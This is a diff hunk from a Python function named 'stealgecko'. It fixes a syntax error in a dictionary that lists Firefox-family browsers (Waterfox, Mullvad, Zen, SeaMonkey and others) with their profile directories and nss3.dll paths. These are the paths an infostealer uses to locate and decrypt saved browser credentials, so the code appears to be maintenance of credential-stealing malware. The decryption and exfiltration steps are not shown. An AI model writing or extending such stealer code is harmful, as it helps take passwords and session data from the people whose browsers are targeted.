@@ -335,7 +335,7 @@ def stealgecko():
         "Firefox Developer Edition": {"path": appdata + "\\Mozilla\\Firefox\\Profiles", "nss": "C:\\Program Files\\Firefox Developer Edition\\nss3.dll"},
         "Waterfox": {"path": appdata + "\\Waterfox\\Profiles", "nss": "C:\\Program Files\\Waterfox\\nss3.dll"},
         "Mullvad": {"path": appdata + "\\Mullvad\\MullvadBrowser\\Profiles", "nss": localappdata + "\\Mullvad\\MullvadBrowser\\Release\\nss3.dll"}, 
-        "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll", 
+        "Zen": {"path": appdata + "\\zen\\Profiles", "nss": "C:\\Program Files\\Zen Browser\\nss3.dll"}, 
         "SeaMonkey": {"path": appdata + "\\Mozilla\\SeaMonkey\\Profiles", "nss": "C:\\Program Files\\SeaMonkey\\nss3.dll"}
     }
     for name, path in gecko_paths.items():
